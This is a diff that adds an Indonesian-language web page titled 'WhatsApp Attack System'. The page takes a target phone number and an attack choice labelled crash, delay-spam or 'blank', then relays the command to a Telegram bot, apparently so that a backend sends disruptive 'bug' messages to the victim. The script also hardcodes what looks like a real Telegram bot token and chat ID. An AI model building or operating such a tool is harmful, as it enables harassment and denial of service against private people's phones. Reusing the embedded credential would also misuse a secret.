@@ -1,0 +1,172 @@
+<!doctype html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>WhatsApp Attack</title>
+
+<style>
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+  font-family: 'Arial', sans-serif;
+}
+body{
+  background:#090b1a;
+  color:white;
+  padding-bottom:80px;
+}
+
+/* HEADER */
+.header{
+  text-align:center;
+  padding:25px 0 10px;
+}
+.header h1{
+  font-size:26px;
+  font-weight:700;
+  color:#c291ff;
+  letter-spacing:2px;
+}
+
+/* CARD */
+.card{
+  width:92%;
+  margin:15px auto;
+  background:#15152a;
+  border:1px solid #272753;
+  border-radius:18px;
+  padding:20px;
+  box-shadow:0 0 20px #7a36ff40;
+}
+
+.input-group{
+  margin-bottom:18px;
+}
+.input-group label{
+  font-size:14px;
+  color:#b9b9b9;
+}
+.input-group input, .input-group select{
+  width:100%;
+  margin-top:6px;
+  padding:12px;
+  border-radius:14px;
+  border:none;
+  background:#101020;
+  color:white;
+  outline:none;
+  border:1px solid #33335a;
+  font-size:15px;
+}
+
+.btn{
+  width:100%;
+  padding:14px;
+  background:linear-gradient(135deg,#7b2bff,#b634ff);
+  border:none;
+  border-radius:18px;
+  color:white;
+  font-size:18px;
+  font-weight:700;
+  cursor:pointer;
+  box-shadow:0 0 18px #b634ff50;
+  margin-top:10px;
+}
+.btn:active{
+  transform:scale(0.97);
+}
+
+/* LOG AREA */
+.log-box{
+  width:92%;
+  margin:20px auto;
+  background:#0f0f20;
+  border:1px solid #2a2a4a;
+  padding:15px;
+  border-radius:16px;
+  height:200px;
+  overflow-y:auto;
+  font-size:14px;
+}
+</style>
+</head>
+<body>
+
+<div class="header">
+  <h1>WhatsApp Attack System</h1>
+</div>
+
+<div class="card">
+
+  <div class="input-group">
+    <label>Nomor WhatsApp Tujuan</label>
+    <input type="number" id="target" placeholder="contoh: 628xxxxxx">
+  </div>
+
+  <div class="input-group">
+    <label>Pilih Pesan</label>
+    <select id="pesan">
+      <option value="/specterdelay">DELAY X CRASH</option>
+      <option value="/twinsdelay">DELAY BEBAS SPAM</option>
+      <option value="/betablank">BLANK [ BETA ]</option>
+    </select>
+  </div>
+
+  <button class="btn" onclick="sendToTelegram()">SEND➡️</button>
+</div>
+
+<div class="log-box" id="log"></div>
+
+<script>
+/* ============================
+   MASUKKAN TOKEN & CHAT ID
+============================ */
+const BOT_TOKEN = "7811339637:AAETzLZke4NKiME7WvPVWq6qqrrTyfThdoc";        // <--- ganti
+const OWNER_ID = "-1003331250049";    // <--- ganti
+
+function log(text){
+  let box = document.getElementById("log");
+  box.innerHTML += `<div>> ${text}</div>`;
+  box.scrollTop = box.scrollHeight;
+}
+
+function sendToTelegram(){
+  let nomor = document.getElementById("target").value;
+  let command = document.getElementById("pesan").value;
+
+  if(nomor.length < 5){
+    log("❌ Nomor tidak valid !!");
+    return;
+  }
+
+  // Format final: "/p 628xxxxx"
+  let finalMessage = `${command} ${nomor}`;
+
+  log("📡 Wait Send Bug To Target...");
+  
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({
+      chat_id: OWNER_ID,
+      text: finalMessage
+    })
+  })
+  .then(res => res.json())
+  .then(data => {
+    if(data.ok){
+      log("✅ Succes Send Bug To Target");
+    } else {
+      log("❌ Error Send Bug To Target");
+    }
+  })
+  .catch(()=>{
+    log("❌ Error Connection");
+  });
+}
+</script>
+
+</body>
+</html>
